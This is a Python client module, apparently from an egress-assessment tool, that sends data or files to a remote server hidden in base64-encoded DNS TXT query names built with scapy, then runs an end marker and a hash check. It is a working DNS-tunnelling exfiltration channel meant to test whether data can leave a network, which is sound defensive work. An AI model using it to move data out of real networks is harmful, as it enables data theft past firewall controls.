"""

This is a DNS client that transmits data within DNS TXT requests
Thanks to Raffi for his awesome blog posts on how this can be done
http://blog.cobaltstrike.com/2013/06/20/thatll-never-work-we-dont-allow-port-53-out/

"""

import base64
import hashlib
import socket
import sys
from common import helpers
import struct
from dnslib import DNSRecord, QTYPE as DnsQTYPE
from scapy.all import *


class Client:

    def __init__(self, cli_object):
        self.protocol = 'dns'
        self.remote_server = cli_object.ip
        self.max_length = 63
        self.current_total = 0
        if cli_object.client_port is None:
            self.port = 53
        else:
            self.port = cli_object.client_port

        if cli_object.file is None:
            self.file_transfer = False
            self.length = 35
        else:
            self.length = 35

            if "/" in cli_object.file:
                self.file_transfer = cli_object.file.split("/")[-1]
            else:
                self.file_transfer = cli_object.file

    def transmit(self, data_to_transmit):

        byte_reader = 0
        check_total = False
        packet_number = 1

        data_bytes = data_to_transmit if isinstance(data_to_transmit, bytes) else data_to_transmit.encode()
        expected_hash = hashlib.sha256(data_bytes).hexdigest()

        # Determine if sending via IP or domain name
        if helpers.validate_ip(self.remote_server):
            final_destination = self.remote_server
        else:
            print('[*] Resolving IP of domain...')
            final_destination = socket.gethostbyname(self.remote_server)

        total_packets = -(-len(data_to_transmit) // self.length)  # ceiling division
        self.current_total = total_packets

        # While loop over the file or data to send
        while byte_reader < len(data_to_transmit):
            if not self.file_transfer:
                try:
                    encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
                    send(IP(dst=final_destination)/UDP()/DNS(
                           id=15, opcode=0, qd=[DNSQR(
                            qname=encoded_data, qtype="TXT")], aa=1, qr=0),
                         verbose=False)
                    sys.stdout.write(f'\r[*] Packet {packet_number}/{int(total_packets)}   ')
                    sys.stdout.flush()

                except KeyboardInterrupt:
                    raise
            else:
                encoded_data = base64.b64encode(str(struct.pack('>I', packet_number)) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])

                while len(encoded_data) > self.max_length:

                    self.length -= 1
                    # calcalate total packets
                    if ((len(data_to_transmit) - byte_reader) % self.length) == 0:
                        packet_diff = (len(data_to_transmit) - byte_reader) / self.length
                    else:
                        packet_diff = ((len(data_to_transmit) - byte_reader) / self.length)
                    check_total = True
                    encoded_data = base64.b64encode(str(struct.pack('>I', packet_number)) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])

                if check_total:
                    self.current_total = packet_number + packet_diff
                    check_total = False

                sys.stdout.write(f'\r[*] Packet {packet_number}/{int(self.current_total)}   ')
                sys.stdout.flush()

                # Craft the packet with scapy
                try:
                    while True:
                        response_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
                            id=15, opcode=0,
                            qd=[DNSQR(qname=encoded_data, qtype="TXT")], aa=1, qr=0),
                            verbose=False, timeout=2)
                        break
                        '''
                        if response_packet:
                            if response_packet.haslayer(DNSRR):
                                dnsrr_strings = repr(response_packet[DNSRR])
                                if str(packet_number) + "allgoodhere" in dnsrr_strings:
                                    break
                        '''

                except KeyboardInterrupt:
                    raise

            # Increment counters
            byte_reader += self.length
            packet_number += 1

        print()

        if self.file_transfer is not False:
            while True:
                final_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
                    id=15, opcode=0,
                    qd=[DNSQR(qname="ENDTHISFILETRANSMISSIONEGRESSASSESS" + self.file_transfer, qtype="TXT")], aa=1, qr=0),
                    verbose=True, timeout=2)
                break
                '''
                if final_packet:
                    break
                '''
        else:
            # Use a real UDP socket so the OS can receive the reply (raw scapy
            # sockets don't reliably capture inbound packets on all platforms).
            packets_sent = packet_number - 1
            verify_query = DNSRecord.question(f'EAVERIFY{packets_sent}', 'TXT')
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            try:
                sock.sendto(verify_query.pack(), (final_destination, self.port))
                resp_data, _ = sock.recvfrom(4096)
            except (socket.timeout, TimeoutError):
                raise RuntimeError('no verification response from DNS server')
            finally:
                sock.close()
            resp = DNSRecord.parse(resp_data)
            for rr in resp.rr:
                if rr.rtype == DnsQTYPE.TXT:
                    server_hash = b''.join(rr.rdata.data).decode('ascii').strip()
                    if server_hash != expected_hash:
                        raise RuntimeError(
                            f'Integrity check failed: '
                            f'client={expected_hash[:16]}… server={server_hash[:16]}…')
                    return
            raise RuntimeError('no verification response from DNS server')
        return
